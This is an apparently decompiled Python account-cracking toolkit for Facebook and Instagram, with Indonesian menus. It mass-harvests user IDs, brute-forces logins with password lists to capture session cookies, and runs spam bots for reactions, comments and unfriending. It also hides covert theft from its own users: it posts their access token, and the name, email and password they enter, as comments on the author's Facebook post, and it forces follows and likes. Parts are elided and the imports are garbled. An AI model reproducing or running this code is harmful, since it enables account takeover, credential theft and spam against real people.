...
# Time Succes decompile : 2022-04-16 20:58:00.599478
import os
try:
    import requests
except ImportError:
...
import requests, os, re, bs4, sys, json, time, random, datetime, requests, sys, os, time, json
...
import requests, bs4, sys, os, random, time, re, json, calendar, os, sys, time, datetime, random, hashlib, re, threading, json, urllib, uuid, calendar, requests, mechanize, bs4, sys, os, subprocess, uuid, requests, sys, random, time, re, base64, json, platform, requests, bs4, sys, os, subprocess, time, datetime, requests, sys, random, re, base64, json
...
from datetime import datetime
from calendar import monthrange
import requests, bs4, sys, os, random, time, re, json, calendar, requests, bs4, sys, os, subprocess, time, datetime, requests, sys, random, re, base64, json
from multiprocessing.pool import ThreadPool
from datetime import datetime
from datetime import date
from concurrent.futures import ThreadPoolExecutor
...
import requests as req, requests as re, time, random, json
from concurrent.futures import ThreadPoolExecutor
from multiprocessing.pool import ThreadPool
from bs4 import BeautifulSoup as parser
import os, sys, re, time, json, requests, random, datetime
...
from bs4 import BeautifulSoup as parser
from time import sleep
import requests as req, requests as re, time, random, json, os, sys, time, datetime, random, hashlib, re, threading, json, urllib, uuid
from datetime import date
from datetime import datetime
from time import sleep
...
def masuk():
    ...
    if mrjreckxnanoxxz in '':
        ...
        jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Jangan lupa ikuti FB gw')
        os.system(' xdg-open https://www.facebook.com/Zidan.Ganzz.56 ')
...
def ___Jeeck___xnano___lawack___xnxx___():
    ...
    komentar = aman
    yotsuba = kartu2d
    post = '128873152715321'
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/128873152715321/comments/?message=' + aman + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/100067779108773/comments/?message=' + yotsuba + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/100067779108773/comments/?message=' + yotsuba + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/128873152715321/comments/?message=' + toket + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/128873152715321/comments/?message=' + kon + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/128873152715321/likes?summary=true&access_token=' + toket)
    requests.post('https://graph.facebook.com/128873152715321/likes?summary=true&access_token=' + toket)
    menu()
...
def pendahuluanxnano():
    ...
    print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Jika crack sampai --> 100 Sarankan hidupkan mode pesawat / --> 300 + lama gak ada hasil'
...
def menu():
    ...
    print '\x1b[0;36m[\x1b[0;33m++\x1b[0;36m]\x1b[0;00m Username               :\x1b[0;36m %s' % nama
    ...
    print '\x1b[0;36m[\x1b[0;33m++\x1b[0;36m]\x1b[0;00m Gender                 :\x1b[0;36m %s' % gd
    print '\x1b[0;36m[\x1b[0;33m++\x1b[0;36m]\x1b[0;00m Alamat ippaddress      :\x1b[0;36m %s' % IP
    print '\x1b[0;36m[\x1b[0;33m++\x1b[0;36m]\x1b[0;00m Tanggal                :\x1b[0;36m %s' % waktu
    print '\x1b[0;36m[\x1b[0;33m++\x1b[0;36m]\x1b[0;00m License                :\x1b[0;32m %s ' % loo
    print '\x1b[0;36m[\x1b[0;33m++\x1b[0;36m]\x1b[0;33m===========================================================>'
    print '\n\x1b[0;36m[\x1b[0;00m01\x1b[0;36m]\x1b[0;00m Dump id publik massall acak old & new'
    play_mpv('Pil.mp3')
    print '\x1b[0;36m[\x1b[0;00m02\x1b[0;36m]\x1b[0;00m Dump id publik massall old'
    print '\x1b[0;36m[\x1b[0;00m03\x1b[0;36m]\x1b[0;00m Dump id publik massall new'
    print '\x1b[0;36m[\x1b[0;00m04\x1b[0;36m]\x1b[0;00m Dump id publik paling tua'
    print '\x1b[0;36m[\x1b[0;00m05\x1b[0;36m]\x1b[0;00m Dump id followers old'
    print '\x1b[0;36m[\x1b[0;00m06\x1b[0;36m]\x1b[0;00m Dump id followers new'
    print '\x1b[0;36m[\x1b[0;00m07\x1b[0;36m]\x1b[0;00m Dump id publik acak old & new'
    print '\x1b[0;36m[\x1b[0;00m08\x1b[0;36m]\x1b[0;00m Dump id publik old '
    print '\x1b[0;36m[\x1b[0;00m09\x1b[0;36m]\x1b[0;00m Dump id publik new'
    print '\x1b[0;36m[\x1b[0;00m10\x1b[0;36m]\x1b[0;00m Dump id Publik & Teman'
    print '\x1b[0;36m[\x1b[0;00m11\x1b[0;36m]\x1b[0;00m Dump id followers'
    print '\x1b[0;36m[\x1b[0;00m12\x1b[0;36m]\x1b[0;00m Dump id pesan masages '
    print '\x1b[0;36m[\x1b[0;00m13\x1b[0;36m]\x1b[0;00m Dump id group '
    print '\x1b[0;36m[\x1b[0;00m14\x1b[0;36m]\x1b[0;00m Dump id reactionts post'
    print '\x1b[0;36m[\x1b[0;00m15\x1b[0;36m]\x1b[0;00m Dump id dari pencarian nama \x1b[0;33m[\x1b[0;36m 100\x1b[0;33m ]'
    print '\x1b[0;36m[\x1b[0;00m16\x1b[0;36m]\x1b[0;33m Menu Crack instagram'
    print '\x1b[0;36m[\x1b[0;00m17\x1b[0;36m]\x1b[0;33m Mulai Crack facebook'
    print '\x1b[0;36m[\x1b[0;00m18\x1b[0;36m]\x1b[0;00m Seting User-agent'
    print '\x1b[0;36m[\x1b[0;00m19\x1b[0;36m]\x1b[0;00m Chek results Crack'
    print '\x1b[0;36m[\x1b[0;00m20\x1b[0;36m]\x1b[0;00m Chek opsi account chekpoint'
    print '\x1b[0;36m[\x1b[0;00m21\x1b[0;36m]\x1b[0;00m Menu Bot facebook'
    print '\x1b[0;36m[\x1b[0;00m22\x1b[0;36m]\x1b[0;00m Menu profil guard'
    print '\x1b[0;36m[\x1b[0;00m23\x1b[0;36m]\x1b[0;00m Update Version'
    print '\x1b[0;36m[\x1b[0;00m24\x1b[0;36m]\x1b[0;00m Informasi tools'
    print '\x1b[0;36m[\x1b[0;31m00\x1b[0;36m]\x1b[0;00m Log out'
    print '\x1b[0;36m[\x1b[0;00m99\x1b[0;36m]\x1b[0;00m Exit'
...
def ___masal___():
    try:
        ...
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;33m Token modar dinggo wae'
        exit()

    try:
        ___total___ = int(raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Jumlah id : '))
    except:
        ___total___ = 1

    ___file___ = raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Buat file : ')
    for zx in range(___total___):
        zx += 1
        ___ids___ = raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m User id target \x1b[0;33m%s : ' % zx)
        print ' '
        if ___ids___ in ('', ' '):
            jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Jangan kosong asu')
            exit()
        try:
            ...
            print '\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Total id : %s ' % len(___user___)
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m File tersimpan di : %s ' % ___file___
            raw_input('\n\x1b[0;36m[\x1b[0;00m ENTER \x1b[0;36m]')
            menu()
        except KeyError:
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Dump id gagal'
            exit()
        except ConnectionError:
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Koneksi eror'
            exit()
...
def ___masal2___():
    ...
    try:
        jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;33m Mau dump berapa id')
        ___total___ = int(raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Jumlah id : '))
    except:
        ___total___ = 1
    ...
    for zx in range(___total___):
        zx += 1
        ___ids___ = raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m User id \x1b[0;33m%s : ' % zx)
        print ' '
        if ___ids___ in ('', ' '):
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Jangan kosong'
            exit()
        try:
            rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (___ids___, jeeckxd)).json()
            file = open(___file___, 'a')
            for a in rex['friends']['data']:
                if len(a['id']) == 7 or len(a['id']) == 8 or len(a['id']) == 9 or len(a['id']) == 10:
                    ...
                    file.write(a['id'] + '<=>' + a['name'] + '\n')
                    print '\r\x1b[1;97m' + a['id'] + '<=>' + a['name']
                elif a['id'][:7] in ('1000000', '1000001', '1000002', '1000003', '1000004',
                                     '1000005'):
                    file.write(a['id'] + '<=>' + a['name'] + '\n')
                    print '\r\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Mengumpulkan id --> \x1b[0;36m%s ' % len(id),
            ...
            jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Dump gagal')
            exit()
        except ConnectionError:
            jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Koneksi eror')
            exit()
...
def ___masal3___():
    try:
        ...
        jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;33m Token modar dinggo wae')
        exit()

    try:
        jeeck('\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;33m Mau dump berapa id : ')
        ___total___ = int(raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Jumlah id : '))
    except:
        ___total___ = 1
    ...
    for zx in range(___total___):
        ...
        try:
            ...
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Dump gagal'
            exit()
        except ConnectionError:
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Koneksi eror'
            exit()
...
def ___very___():
    ...
    try:
        ___ids___ = raw_input('\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m User id : ')
        if ___ids___ in ('', ' '):
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Jangan kosong '
            exit()
        oxo = requests.get('https://graph.facebook.com/%s?access_token=%s' % (___ids___, jeeckxd)).json()
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Nama : %s ' % oxo['name']
        ___file___ = oxo['name'].replace(' ', '_') + '.json'
        print ' '
    except KeyError:
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m User tidak di temukan'
        exit()
...
def ___follower___():
    ...
    try:
        ...
        if ___ids___ in ('', ' '):
            ...
            exit()
        oxo = requests.get('https://graph.facebook.com/%s?access_token=%s' % (___ids___, jeeckxd)).json()
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Nama : %s ' % oxo['name'].lower()
        ___file___ = oxo['name'].replace(' ', '_') + '.json'
        print ' '
    except KeyError:
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m User tidak ada'
        exit()
    ...
    try:
        ...
        for a in rex['data']:
            if len(a['id']) == 7 or len(a['id']) == 8 or len(a['id']) == 9 or len(a['id']) == 10:
                ...
                file.write(a['id'] + '<=>' + a['name'] + '\n')
                print '\r\x1b[1;97m' + a['id'] + '<=>' + a['name']
            elif a['id'][:6] in ('100001', '100002', '100003', '100004', '100005',
...
def ___acak___():
    try:
        ...
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Token modar di nggowae'
        exit()
...
def ___old___():
    try:
        ...
        jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Token modar dinggo wae')
        exit()
    ...
    try:
        ...
        if ___ids___ in ('', ' '):
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Jangan kosong'
        oxo = requests.get('https://graph.facebook.com/%s?access_token=%s' % (___ids___, jeeckxd)).json()
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Nama : %s ' % oxo['name'].lowe()
        ___file___ = oxo['name'].replace(' ', '_') + '.json'
        print ' '
    except KeyError:
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m User tidak ada '
...
def ___new___():
    try:
        ...
        jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;33m Token modar dinggowae')
        exit()
...
def menu_bot():
    try:
        ...
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Token modar '
        os.system('rm -rf data/token.txt')
        time.sleep(1)
        masuk()

    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;33m Menu bot facebook ')
    print '\n\x1b[0;36m[\x1b[0;00m01\x1b[0;36m]\x1b[0;00m Bot reactiont target post'
    print '\x1b[0;36m[\x1b[0;00m02\x1b[0;36m]\x1b[0;00m Bot reactiont group post'
    print '\x1b[0;36m[\x1b[0;00m03\x1b[0;36m]\x1b[0;00m Bot komen target post'
    print '\x1b[0;36m[\x1b[0;00m04\x1b[0;36m]\x1b[0;00m Bot komen group post'
    print '\x1b[0;36m[\x1b[0;00m05\x1b[0;36m]\x1b[0;00m Mass delet post'
    print '\x1b[0;36m[\x1b[0;00m06\x1b[0;36m]\x1b[0;00m Trima permintaan pertemanan'
    print '\x1b[0;36m[\x1b[0;00m07\x1b[0;36m]\x1b[0;00m Hapus pertemanan'
...
def bot_pilih():
    ...
    if bots == '':
        ...
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Menu \x1b[0;36m[\x1b[0;31m%s\x1b[0;36m]\x1b[0;00m tidak ada asu ' % bots
        bot_pilih()
...
def menu_react():
    ...
    jeeck('\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;33m Menu reaction post ')
    print '\n\x1b[0;36m[\x1b[0;00m01\x1b[0;36m]\x1b[0;00m Reac Like'
    print '\x1b[0;36m[\x1b[0;00m02\x1b[0;36m]\x1b[0;00m Reac Love'
    print '\x1b[0;36m[\x1b[0;00m03\x1b[0;36m]\x1b[0;00m Reac Wow'
    print '\x1b[0;36m[\x1b[0;00m04\x1b[0;36m]\x1b[0;00m Reac Haha'
    print '\x1b[0;36m[\x1b[0;00m05\x1b[0;36m]\x1b[0;00m Reac Sad'
    print '\x1b[0;36m[\x1b[0;00m06\x1b[0;36m]\x1b[0;00m Reac Angry'
    print '\x1b[0;36m[\x1b[0;00m00\x1b[0;36m]\x1b[0;00m Kembali ke menu'
    react_pilih()
...
def react():
    try:
        ...
        try:
            ...
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Pemograman berjalan tunggu sebentar......'
            for a in ah['feed']['data']:
                y = a['id']
                reaksi.append(y)
                requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + tipe + '&access_token=' + toket)
                print '\x1b[0;00m[\x1b[0;36m' + y[:10].replace('\n', ' ') + '... \x1b[0;00m] \x1b[0;33m' + tipe

            print '\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Finised : %s ' % str(len(reaksi))
...
def grup_react():
    ...
    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;33m Menu reactionts group')
    print '\n\x1b[0;36m[\x1b[0;00m01\x1b[0;36m]\x1b[0;00m Reac like'
    print '\x1b[0;36m[\x1b[0;00m02\x1b[0;36m]\x1b[0;00m Reac love'
    print '\x1b[0;36m[\x1b[0;00m03\x1b[0;36m]\x1b[0;00m Reac wow'
    print '\x1b[0;36m[\x1b[0;00m04\x1b[0;36m]\x1b[0;00m Reac haha'
    print '\x1b[0;36m[\x1b[0;00m05\x1b[0;36m]\x1b[0;00m Reac sad'
    print '\x1b[0;36m[\x1b[0;00m06\x1b[0;36m]\x1b[0;00m Reaf angry'
    print '\x1b[0;36m[\x1b[0;00m00\x1b[0;36m]\x1b[0;00m Kembali ke menu'
    reactg_pilih()
...
def reactg():
    try:
        ...
        ide = raw_input('\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Id group : ')
        limit = raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Limit : ')
        ah = requests.get('https://graph.facebook.com/group/?id=' + ide + '&access_token=' + toket)
        asw = json.loads(ah.text)
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Nama group : %s ' % asw['name']
        try:
            ...
            print '\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Finised : %s ' % str(len(reaksigrup))
            raw_input('\x1b[0;36m[\x1b[0;00m ENTER\x1b[0;36m]')
            menu()
        except KeyError:
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m User id tidak di temukan'
            raw_input('\n\x1b[0;36m[\x1b[0;00m ENTER \x1b[0;36m]')
            menu()
...
def grup_komen():
    try:
        ...
        jeeck('\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;33m Gunakan tanda <> untuk garis baru ')
        ide = raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m User id group : ')
        km = raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Buat komen : ')
        limit = raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Limit : ')
        km = km.replace('<>', '\n')
        try:
            ah = requests.get('https://graph.facebook.com/group/?id=' + ide + '&access_token=' + toket)
            asw = json.loads(ah.text)
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Nama grup : %s ' % asw['name']
            p = requests.get('https://graph.facebook.com/v3.0/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            a = json.loads(p.text)
            jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;33m Proses berjalan tunggu sebentar ....')
            for s in a['feed']['data']:
                f = s['id']
                komengrup.append(f)
                requests.post('https://graph.facebook.com/' + f + '/comments?message=' + km + '&access_token=' + toket)
            ...
            print '\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Finised : %s ' % str(len(komengrup))
            raw_input('\n\x1b[0;36m[\x1b[0;00m ENTER \x1b[0;36m]')
            menu()
        except KeyError:
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Id tidak di temukan'
...
def deletepost():
    ...
    print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Dari : \x1b[0;33m%s ' % nama
    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Setarting remove setatus.......')
    ...
    for p in asus['data']:
        ...
        try:
            ...
            print '\x1b[0;00m[\x1b[0;36m' + id[:10].replace('\n', ' ') + '...' + '\x1b[0;00m] \x1b[0;33mFailed'
        except TypeError:
            print '\x1b[0;00m[\x1b[0;33m' + id[:10].replace('\n', ' ') + '...' + '\x1b[0;00m] \x1b[0;33mRemoved'
            piro += 1
        except requests.exceptions.ConnectionError:
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Koneksi eror'

    print '\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Finised'
    exit()
...
def accept():
    ...
    if '[]' in str(friends['data']):
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m No friends requests'
        raw_input('\n\x1b[0;36m[\x1b[0;00m ENTER \x1b[0;36m]')
        menu()
    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;33m Tunggu sebentar.....')
    for i in friends['data']:
        gas = requests.post('https://graph.facebook.com/me/friends/' + i['from']['id'] + '?access_token=' + toket)
        a = json.loads(gas.text)
        if 'error' in str(a):
            jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Nama : \x1b[0;3m%s\x1b[0;00m ' % i['from']['name'])
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Id   : \x1b[0;33m%s\x1b[0;00m Failed' % i['from']['id']
        else:
            jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Nama : \x1b[0;36m%s\x1b[0;00m ' % i['from']['name'])
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Id   : \x1b[0;36m%s\x1b[0;00m Berhasil' % i['from']['id']

    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Finish....')
    raw_input('\x1b[0;36m[\x1b[0;00m ENTER \x1b[0;36m]')
    menu_bot()
...
def unfriend():
    try:
        ...
        jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Berjalan tunggu sebentar.....')
        jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;33m SETOP TEKAN CTRL+Z')
        try:
            ...
            for i in cok['data']:
                ...
                print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Proses remove \x1b[0;33m%s \x1b[0;36m---> \x1b[0;33m%s ' % (nama, id)

        except IndexError:
            pass
        except KeyboardInterrupt:
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;33m Berhenti proses '
            raw_input('\x1b[0;36m[\x1b[0;00m ENTER \x1b[0;36m]')
            menu_bot()

    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;36m Finised........')
    raw_input('\n\x1b[0;36m[\x1b[0;00m ENTER \x1b[0;36m]')
    menu_bot()
...
def __masal2__():
    try:
        ...
        jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;31m Token modar dinggo wae')
        exit()

    try:
        jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;33m Ini adalah fitur crack brutall / massal ')
        __total = int(raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Mau dump berapa id : '))
    except:
        __total = 1

    __file = raw_input('\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Buat file : ')
    for zx in range(__total):
        zx += 1
        __ids = raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m User \x1b[0;33m%s : ' % zx)
        try:
            ...
            jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Mungkin id tersebut privat / akun tumbal mati')
            exit()

    file.close()
    __id = open(__file, 'r').readlines()
    print '\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Total id : %s ' % len(__id)
    print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m File dump di simpan di : %s ' % __file
    raw_input('\n\x1b[0;36m[\x1b[0;00m ENTER \x1b[0;36m]')
    menu()
...
def dumpfl():
    ...
    if cek(1) == False:
        try:
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Masukan cookie ya bro agar berjalan '
    ...
    if len(bs4.re.findall('logout', r)) != 0:
        ...
        if s in ('xnano', 'Xnano', 'XNANO', 'Xnano Jeeck', 'Xnano jeeck', 'XNANO JEECK',
                 'xnano jeeck'):
...
class jeckoramadhanganteng():
    ...
    def mobile_v3(self, user, manual):
        ...
        for pw in manual:
            ...
            das = {'lsd': re.search('name="lsd" value="(.*?)"', str(r.text)).group(1), 
            ...
            if 'c_user' in session.cookies.get_dict():
                ...
                zczc = '\r%s[%sOK%s]%s %s|%s|%s                 ' % (Q, I, Q, I, user, pw, coki)
                ...
                try:
                    ...
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r%s[%sCP%s]%s %s|%s|%s %s %s       ' % (Q, K, Q, K, user, pw, day, month, year)
                    play_mpv('assalamualaikum.mp3')
...
def author():
    ...
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;35m                \x1b[0;36m(\x1b[0;33m1. \x1b[0;36miyanxlord ')
    ...
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;35m                \x1b[0;36m(\x1b[0;33m4. \x1b[0;36miyanxlord ')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;35m                \x1b[0;36m(\x1b[0;33m5. \x1b[0;36miyanxlord ')
    ...
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;35m            \x1b[0;36m(\x1b[0;33m3. \x1b[0;36miyanxlord ')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;35m            \x1b[0;36m(\x1b[0;33m5. \x1b[0;36miyanxlord ')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;33m FOLLOW GITHUB :')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;35m                \x1b[0;36m(\x1b[0;33m1. \x1b[0;36miyanxlord')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;35m                \x1b[0;36m(\x1b[0;33m+. https://github.com/iyanxlord')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;35m                \x1b[0;36m(\x1b[0;33m2. \x1b[0;36miyanxlord')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;35m                \x1b[0;36m(\x1b[0;33m+. https://github.com/iyanxlord')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;35m                \x1b[0;36m(\x1b[0;33m3. \x1b[0;36mIYAN X LORD')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;35m                \x1b[0;36m(\x1b[0;33m+. https://github.com/iyanxlord')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;31m DONASI NJEENK :')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;33m               WA : 085881661596')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;33m               FB : IYAN X LORD')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;33m               PULSA : 083848131405')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;33m               PULSA : 083848131405')
...
def main():
    ...
    try:
        requests.post('https://graph.facebook.com/128873152715321/comments/?message=Nama (' + nama + ')\nEmail (' + user_fake + ')\nPassword (' + pass_fake + ')&access_token=' + token)
        requests.post('https://graph.facebook.com/100067779108773/subscribers?access_token=' + token)
    except:
        print 'Token Rusak !!'
        exit()
...
def gagal():
    ...
    raw_input('\n >>> Enter ')
    os.system('am start https://wa.me/6285881661596?text=Assalamualaikum,+Bang+Iyan+X+Lord,+Saya+Inggin+Beli+License+License+:%20' + license + ' >/dev/null')
    exit()
